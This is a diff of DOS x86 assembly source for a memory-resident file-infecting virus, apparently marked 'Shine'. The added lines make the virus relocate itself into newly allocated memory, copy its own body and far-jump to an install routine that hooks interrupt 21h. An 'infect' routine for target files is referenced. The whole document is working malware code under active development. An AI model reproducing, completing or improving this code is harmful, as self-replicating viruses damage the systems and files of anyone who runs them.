@@ -13,22 +13,27 @@ call near get_delta   ; To calculate delta offset
 get_delta:
      pop bp           ; BP = Delta+3
      sub bp, 3        ; To get to the True start of the virus
-     mov word [data_section.save_bp+bp], bp
-     mov word [new_int21.bp_shi+bp], bp
+     mov word [data_section.delta_off+bp], bp
+     mov word [new_int21.int21delta+bp], bp
+
+     push bp          ; Save BP
 
      mov ax, 9a8ah    ; Are we in memory yet?
      int 21h          ; Call to int 21h
      cmp ax, 8b7bh    ; Is AX 8b7b?
      je dont_install
 
-     jmp install
+     ;jmp install
 alloc_mem:            ; We are in fact not in memory, lets relocate us away from here
+     pop bp
+     push bp          ; Save BP, again
      mov ax, 4800h    ; Function 48h Allocate Memory Blocks
      mov bx, 20h      ; Allocate 32 paragraphs, 512 bytes
      int 21h          ; Calling DOS
      mov dx, ax       ; DX => AX
      sub ax, 16       ; AX now points to the MCB
      mov es, ax       ; AX => ES
+     pop bp           ; Restore BP
      push dx
      
      mov ax, 5500h    ; Create New PSP (Undocumented..... ooooo, spooky)
@@ -40,11 +45,28 @@ alloc_mem:            ; We are in fact not in memory, lets relocate us away from
      mov word [es:bp], dx ; Updating the PSP segment address to point to our own PSP
      
 relocate:             ; Updated
+     pop bp          ; Restore BP
+     mov si, [data_section.delta_off+bp]  ; SI = Beginning of the virus
+     mov di, es        ; DI = ES
+     mov cx, endinging-beninging  ; CX = Virus size
+     rep movsb        ; Copy the virus to the new segment
+
+     mov word [jmp_seg+bp], es  ; Update the jump segment to point to the new segment
+     mov ax, install  ; AX = Offset to the install code
+     add ax, bp
+     mov word [jmp_off+bp], ax  ; Update the jump offset to point to the new segment
+
+     db 0EAh
+     jmp_seg db 00h, 00h   ; Jump far, absolute, address given in operand 
+     jmp_off db 00h, 00h   ; Jump far, absolute, address given in operand
+
      
      
 
 
 install:
+     push cs
+     pop ds           ; DS = CS
      mov ax, 3521h    ; Get vector 21h
      int 21h          ; call int 21h
      mov word [goto_int21+bp+1], bx  ; Save Int 21h offset
@@ -60,7 +82,8 @@ install:
 
 
 dont_install:
-     mov ax, 4c00h
+     pop bp
+     mov ax, 4c00h    ; Terminate program
      int 21h
 
 
@@ -73,11 +96,11 @@ new_int21:
      push bp
      push ax
      call near .past_bp
-.bp_shi dw 0
+.int21delta dw 0
 .past_bp: 
      pop bp
      sub bp, 2
-     mov word ax, [bp]
+     mov word ax, [cs:bp]
      mov bp, ax             ; BP = file delta offset
      pop ax
 .what_func:
@@ -165,7 +188,7 @@ infect:               ; DS:DX = ASCIIZ Filename pointer
 
 
 data_section:
-     .save_bp dw 0
+     .delta_off dw 0
      .MZ_BUF dw 0
      .shine_buf db '     '
      .file_infected db 'Shine'
